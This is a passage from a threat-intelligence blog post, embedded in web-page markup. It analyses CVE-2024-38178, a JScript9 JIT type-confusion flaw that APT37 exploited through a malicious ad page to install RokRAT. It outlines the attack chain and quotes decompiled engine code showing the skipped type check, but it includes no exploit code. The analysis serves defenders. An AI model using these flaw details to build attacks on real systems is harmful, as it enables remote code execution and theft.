12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" rel="noopener follow" href="/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" rel="noopener follow" href="/search?source=---top_nav_layout_nav----------------------------------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="a743" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><a rel="noopener follow" href="/@s2w?source=post_page-----91ad954dbf83--------------------------------"><div><div class="bm" aria-hidden="false"><div class="l ib ic by id ie"><div class="l fj"><img alt="S2W" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*1DiWQYMzvUSAzrLJQX1z6g.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></div></div></a><a href="https://medium.com/s2wblog?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><div class="ih ab fj"><div><div class="bm" aria-hidden="false"><div class="l ii ij by id ik"><div class="l fj"><img alt="S2W BLOG" class="l fd by br il cx" src="https://miro.medium.com/v2/resize:fill:48:48/1*3vCxewFUeWWkQ-O5X558rQ.jpeg" width="24" height="24" loading="lazy" data-testid="publicationPhoto"/><div class="if by l br il fs n ig ft"></div></div></div></div></div></div></a></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="im ab q"><div class="ab q in"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b io ip bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" data-testid="authorName" rel="noopener follow" href="/@s2w?source=post_page-----91ad954dbf83--------------------------------">S2W</a></p></div></div></div><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b io ip du"><span><a class="it iu ah ai aj ak al am an ao ap aq ar ex iv iw" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb408bb1e7c46&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;user=S2W&amp;userId=b408bb1e7c46&amp;source=post_page-b408bb1e7c46----91ad954dbf83---------------------post_header-----------">Follow</a></span></p></div></div></span></div></div><div class="l ix"><span class="bf b bg z du"><div class="ab cn iy iz ja"><div class="jb jc ab"><div class="bf b bg z du ab jd"><span class="je l ix">Published in</span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar iq ab q" data-testid="publicationName" href="https://medium.com/s2wblog?source=post_page-----91ad954dbf83--------------------------------" rel="noopener follow"><p class="bf b bg z jf jg jh ji jj jk jl jm bk">S2W BLOG</p></a></div></div></div><div class="h k"><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span></div></div><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">17 min read</span><div class="jn jo l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Oct 16, 2024</span></div></span></div></span></div></div></div><div class="ab cp jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke"><div class="h k w fg fh q"><div class="ku l"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fs2wblog%2F91ad954dbf83&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;user=S2W&amp;userId=b408bb1e7c46&amp;source=-----91ad954dbf83---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao la lq lr ab q fk ls lt" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lu"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q kf kg kh ki kj kk kl km kn ko kp kq kr ks kt"><div class="lv k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F91ad954dbf83&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;source=-----91ad954dbf83---------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lw" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lx cn"><div class="l ae"><div class="ab cb"><div class="ly lz ma mb mc md ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh mi mj mk ml s mm mn mo mp mq mr ms u mt mu mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh mi mj mk ml s mm mn mo mp mq mr ms u mt mu mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="af0a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Author: </strong>Hosu Choi, Minyeop Choi | S2W Talon</p><blockquote class="nu nv nw"><p id="680b" class="mw mx nx my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv"><em class="gu">Last modified</em></strong><em class="gu">: Oct 16, 2024</em></p></blockquote><h1 id="068e" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Executive Summary</h1><p id="a5e7" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk"><strong class="my gv">(Vulnerability Overview) </strong>On August 13, 2024, Microsoft patched <a class="af pb" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38178" rel="noopener ugc nofollow" target="_blank">CVE-2024-38178</a>, a vulnerability within JScript9.dll, as part of the August Patch Tuesday.</p><p id="2f23" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">(Vulnerability Cause) </strong>CVE-2024-38178 is a type confusion vulnerability caused by the JIT engine in JScript9.dll performing incorrect optimizations on variables initialized with the <strong class="my gv">usual arithmetic conversion</strong> exception operator, which can be used to bypass the CVE-2022-41128 patch released in November 2022.</p><ul class=""><li id="fbb2" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pc pd pe bk">CVE-2022-41128 is publicly available with detailed analysis and was exploited by a threat group behind North Korea in 2022, so it is likely that attackers quickly weaponized the vulnerability.</li><li id="4430" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">An attacker exploiting this vulnerability can remotely execute code on a targeted Windows system.</li></ul><p id="2036" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">(Related threat groups and attacks)</strong> In June 2024, APT37 (Scarcruft), a North Korea-based threat group, exploited this vulnerability in an in-the-wild attack against specific organizations in South Korea.</p><ul class=""><li id="b7e5" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pc pd pe bk"><strong class="my gv">(Related sample) </strong>12721952796–107–0_1.ad_toast.html (MD5: <a class="af pb" href="https://www.virustotal.com/gui/file/736092b71a9686fde43d3c4abd941a6774721b90b17d946c9d05af19c84df0a4/detection" rel="noopener ugc nofollow" target="_blank">e11bb2478930d0b5f6c473464f2a2b6e</a>)</li><li id="93ac" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><strong class="my gv">(Distribution method)</strong> Malicious script downloaded from attacker’s C&amp;C server* via freeware’s ad add-on feature process (*Uses a domain similar to a specific network advertising vendor name)</li><li id="cf37" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><strong class="my gv">(Behavior</strong>) After downloading the malicious script, the behavior is similar to previous attacks in 2021 via<strong class="my gv"> </strong>Ruby scripts. <br/><strong class="my gv"> — </strong><a class="af pb" rel="noopener" href="/s2wblog/matryoshka-variant-of-rokrat-apt37-scarcruft-69774ea7bf48"><strong class="my gv">[S2W] Matryoshka : Variant of ROKRAT, APT37 (ScarCruft)</strong></a></li><li id="e4bc" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><strong class="my gv">(Final malware) </strong>Finally identified as ROKRAT malware that communicates with cloud storage (Yandex, pCloud)</li></ul><p id="6182" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">(Countermeasures) </strong>Vendors should pay special attention to versioning and vulnerability response for key modules used by legacy engines, as it is difficult for users to respond to exploits targeting software that uses outdated Windows libraries.</p><h1 id="c3d0" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Introduction</h1><p id="79a0" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">On August 13, 2024, Microsoft patched CVE-2024-38178, a remote code execution vulnerability in JScript9.dll, as part of its August Patch Tuesday.</p><p id="bc16" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In June 2024, the vulnerability was exploited in an attack targeting products from a South Korean software vendor, and S2W obtained and analyzed a sample of the malware. After identifying the mechanism by which the targeted software executed JavaScript code embedded in the ad page in JScript9.dll*, the attacker used the vulnerability to trigger remote code execution and perform malicious actions on the victim’s Windows system.</p><p id="4167" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">* See <strong class="my gv">Appendix A. JScript9.dll Overview</strong> for an overview of the JScript9.dll scripting engine.</p><p id="8ed0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Sample analysis confirmed that CVE-2024-38178 is a type confusion vulnerability bypassing the existing <strong class="my gv">CVE-2022-41128*</strong>patch.</p><p id="6651" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">* CVE-2022-41128 </strong>is<strong class="my gv"> </strong>a type confusion vulnerability in JScript9.dll that was used by the North Korea-based threat group APT37 in October 2022 in malware disguised as a document titled “Situation of the Itaewon Incident in Yongsan, Seoul”.</p><ul class=""><li id="20d4" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pc pd pe bk">Related malware analysis report: <a class="af pb" href="https://blog.google/threat-analysis-group/internet-explorer-0-day-exploited-by-north-korean-actor-apt37/" rel="noopener ugc nofollow" target="_blank"><strong class="my gv">Internet Explorer 0-day exploited by North Korean actor APT37</strong></a></li><li id="efa0" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Detailed analysis report of the vulnerability: <a class="af pb" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-41128.html" rel="noopener ugc nofollow" target="_blank"><strong class="my gv">CVE-2022-41128: Type confusion in Internet Explorer’s JScript9 engine</strong></a></li></ul><h1 id="6ff9" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Detailed Analysis</h1><h2 id="1aa8" class="pk nz gu bf oa pl pm dy oe pn po ea oi nh pp pq pr nl ps pt pu np pv pw px py bk">1. In-The-Wild Vulnerability Exploitation Flow</h2><p id="2626" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">The attacker is believed to have created a domain similar to that of a specific ad agency service provider and then approached the targeted software vendor to register a similar domain.</p><p id="d286" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The registered service is then rendered in the vendor&#x27;s ad pop-up process of software. Typically, ad pages contain JavaScript to monitor events, such as the number of visits and ad pop-ups legacy WebView uses the JScript9 engine to execute JavaScript.</p><p id="60df" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The attacker targeted Windows users and injected an obfuscated JavaScript payload into the page the attacker constructed. Because the ad popup event typically occurs shortly after the victim launches the targeted software, the attacker was able to trigger a zero-day vulnerability in JScript9 (CVE-2024-38178) to perform malicious actions without further interaction.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg qh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*buHo6ydCb774gg64BFVRog.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*buHo6ydCb774gg64BFVRog.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*buHo6ydCb774gg64BFVRog.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*buHo6ydCb774gg64BFVRog.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*buHo6ydCb774gg64BFVRog.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*buHo6ydCb774gg64BFVRog.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*buHo6ydCb774gg64BFVRog.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*buHo6ydCb774gg64BFVRog.png 640w, https://miro.medium.com/v2/resize:fit:720/1*buHo6ydCb774gg64BFVRog.png 720w, https://miro.medium.com/v2/resize:fit:750/1*buHo6ydCb774gg64BFVRog.png 750w, https://miro.medium.com/v2/resize:fit:786/1*buHo6ydCb774gg64BFVRog.png 786w, https://miro.medium.com/v2/resize:fit:828/1*buHo6ydCb774gg64BFVRog.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*buHo6ydCb774gg64BFVRog.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*buHo6ydCb774gg64BFVRog.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="865" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 1. Complete malware execution flow</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="155c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The attacker exploited the vulnerability to execute arbitrary code, allowing them to configure the download of additional malware through multiple shares. The downloaded malware consists of a Ruby engine, a Ruby script, and an encrypted file decrypted by the Ruby script. The decrypted malware was executed by randomly selecting two executables in system32 and executing the injection in two stages by placing RokRAT in memory. The C2 of RokRAT used here was either Yandex or PCloud, consistent with the strategies, tactics, and procedures (TTPs) found in previous attacks by the APT37 attack group.</p><p id="3395" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Reference Report&gt; </strong><a class="af pb" rel="noopener" href="/s2wblog/matryoshka-variant-of-rokrat-apt37-scarcruft-69774ea7bf48"><strong class="my gv">[S2W] Matryoshka : Variant of ROKRAT, APT37 (Scarcruft)</strong></a></p><h2 id="a4f6" class="pk nz gu bf oa pl pm dy oe pn po ea oi nh pp pq pr nl ps pt pu np pv pw px py bk">2. Root Cause Analysis</h2><p id="6b3b" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">The JIT compiler of JScript9 performs optimizations on code that is executed repeatedly, and one of these optimization functions, <code class="cx qy qz ra rb b">GlobOpt::OptArraySrc</code>, calls the <code class="cx qy qz ra rb b">ValueType::IsUninitialized</code> function on the variables to be optimized.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="a87e" class="rf nz gu rb b bg rg rh l ri rj">void __fastcall GlobOpt::OptArraySrc(struct BasicBlock **this, IR::Opnd **a2)<br/>{<br/>//...<br/>      v10 = (v43 + 16);<br/>      if ( !GlobOpt::IsLoopPrePass(this) &amp;&amp; !ValueType::IsUninitialized(v10) )<br/>      {<br/>        v35[0] = *(v8 + 10);<br/>        // ValueType::ISUninitialized return false<br/>        if ( ValueType::IsUninitialized(v35) )<br/>        {<br/>          // skip type check<br/>          IR::Opnd::SetValueType(v6, *(v8 + 16));<br/>          v6 = v39;<br/>        }<br/>      }<br/>    }<br/>    goto LABEL_15;<br/>//...c</span></pre><p id="79be" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The branching that follows the call to <code class="cx qy qz ra rb 